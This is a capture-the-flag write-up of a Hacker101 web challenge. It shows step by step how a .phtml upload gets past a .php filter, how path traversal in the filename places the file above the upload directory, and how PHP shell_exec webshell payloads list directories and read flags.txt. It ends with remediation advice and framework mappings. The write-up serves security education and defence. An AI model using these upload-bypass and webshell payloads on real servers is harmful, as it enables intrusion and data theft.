# Y2FuIHlvdSByZWNvbj8/ (Can You Recon?) — Writeup (3/3)

**Difficulty:** Moderate  
**Category:** Web (File Upload Bypass, Path Traversal, RCE)  
**Flags:** 3/3 (complete)  
**Platform:** Hacker101 CTF  
**Base64 name:** Y2FuIHlvdSByZWNvbj8/ = "can you recon?"

---

## Challenge Overview

**Context:** A web application with file upload. The base64 name ("can you recon?") is the hint: the first step is reconnaissance to discover what the server accepts and where files are stored. The extension restriction blocks `.php` but accepts `.phtml`, and the filename field does not validate path traversal.

**What you face:** An upload screen with an extension filter, an upload directory that serves files, and flags stored in `flags.txt` one level above the webroot.

**Vulnerabilities exploited:**
- File Extension Bypass (CWE-434) — `.phtml` is executed as PHP but not filtered
- Path Traversal in Filename (CWE-22) — `../hello.phtml` saves outside the upload directory
- RCE via PHP Upload — `shell_exec()` to list directories and read `flags.txt`

**What you learn:**
- Alternative PHP extensions: `.phtml`, `.php5`, `.phar`, `.shtml` — the list doesn't end at `.php`
- Path traversal in upload filename: the server may accept `../` in the file name
- How to go from limited RCE (shell_exec) to reading a flags file
- Progressive recon strategy: `ls` → `ls ..` → `cat ../flags.txt`
- Never trust extension to determine file type — check magic bytes and block execution in upload directory

---

## Objective

Exploit a PHP file upload disguised as HTML plus path traversal to achieve RCE and read the flags.

---

## Step 1: Reconnaissance via Fuzzing

```bash
ffuf -u https://<INSTANCE>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Endpoints returning 403:
```
.htaccess
.hta
.htpasswd
admin
server-status
```

The presence of `admin` as 403 indicates a protected area. File upload is available.

---

## Step 2: Identify Extension Restriction

Try uploading `hello.php`:
- Error: "php files are not allowed"

---

## Step 3: Extension Bypass with `.phtml`

`.phtml` is executed as PHP but has an HTML extension. The server allows the upload.

**Upload via form:**
- Filename: `../hello.phtml`
- Content: PHP payload

**The `../` path traversal in the filename** causes the file to be saved one level above the upload directory.

---

## Step 4: Verify PHP Execution

Access: `https://<INSTANCE>/hello.phtml`

File content for testing:
```php
<?php echo "Hello World!"; ?>
```

If "Hello World!" appears → PHP is being executed.

---

## Step 5: Command Execution

Upload:
```php
<?php $out = shell_exec('ls'); echo $out; ?>
```

Accessing `/hello.phtml` returns the directory listing:
```
admin
admin-settings.js
hello.phtml
index.php
```

---

## Step 6: Path Traversal to the Directory Above

Upload:
```php
<?php $out = shell_exec('ls ..'); echo $out; ?>
```

Returns:
```
Autoload.php Flag.php Output.php Route.php View.php controllers data flags.txt index.html models public routes view
```

**`flags.txt` found!**

---

## Step 7: Read All Flags

Upload:
```php
<?php $out = shell_exec('cat ../flags.txt'); echo $out; ?>
```

Returns all 3 flags.

---

## Attack Summary

```
1. ffuf to discover structure + admin area
2. Upload .phtml (alternative PHP extension accepted by server)
3. Path traversal ../hello.phtml in filename → saves in root directory
4. Access to /hello.phtml → PHP execution confirmed
5. shell_exec('ls ..') → flags.txt discovered
6. shell_exec('cat ../flags.txt') → FLAGS 0, 1, 2
```

## Lessons Learned

1. **Alternative PHP extensions** (`.phtml`, `.php5`, `.phar`, `.shtml`) bypass simple extension filters
2. **Path traversal in filename** (`../`) can place files outside the upload directory
3. **Never trust extension**: verify the real MIME type and use `move_uploaded_file()` with a strict whitelist
4. **RCE via webshell upload** is critical: disable PHP execution in upload directories with `.htaccess` or server configuration
5. **flags.txt** in accessible directories is a Hacker101 pattern; always explore the directory tree

## Remediation

- Use a strict allowlist for file extensions AND validate content by magic bytes
- Strip path separators (`../`, `/`, `\`) from uploaded filenames server-side
- Store uploads outside the webroot or disable script execution in upload directories
- Rename uploaded files with random hashes, ignoring the original extension entirely
- Apply `open_basedir` and `disable_functions` in PHP to limit shell access

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 |
| Collection | Data from Local System | T1005 |

---

## OWASP Top 10 2021

- **A04:2021 Insecure Design**: extension blocklist instead of allowlist; no content-type validation
- **A01:2021 Broken Access Control**: path traversal allows writing files outside the upload directory
- **A05:2021 Security Misconfiguration**: PHP execution enabled in web-accessible upload paths

## MITRE D3FEND Countermeasures

- **D3-FCR (File Content Rules)**: validate uploaded file content by magic bytes, not extension alone
- **D3-PSEP (Process Segment Execution Prevention)**: disable script execution in upload directories
- **D3-FE (File Encryption)**: encrypt uploaded files at rest to prevent direct execution

## NIST CSF 2.0

- **Protect (PR.DS)**: enforce strict validation on uploaded file names and content types
- **Detect (DE.CM)**: monitor for new executable files appearing in web-accessible directories
- **Respond (RS.MI)**: isolate and remove webshells immediately upon detection

## NIST SP 800-53 Rev. 5

- **SI-10 (Information Input Validation)**: sanitize filenames by stripping traversal sequences and enforcing an extension allowlist
- **CM-7 (Least Functionality)**: disable PHP execution in upload directories; restrict `shell_exec` and related functions
- **AC-3 (Access Enforcement)**: restrict write access to web-accessible directories
- **SI-3 (Malicious Code Protection)**: scan uploaded files for executable content before storage

---

Thanks guys!! (❍ᴥ❍ʋ)

---

A blocklist is a wish list. If this breakdown on how `.phtml` slips past `.php` filters while path traversal hands you the webroot made you rethink your upload validation, drop a follow and spread the knowledge.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
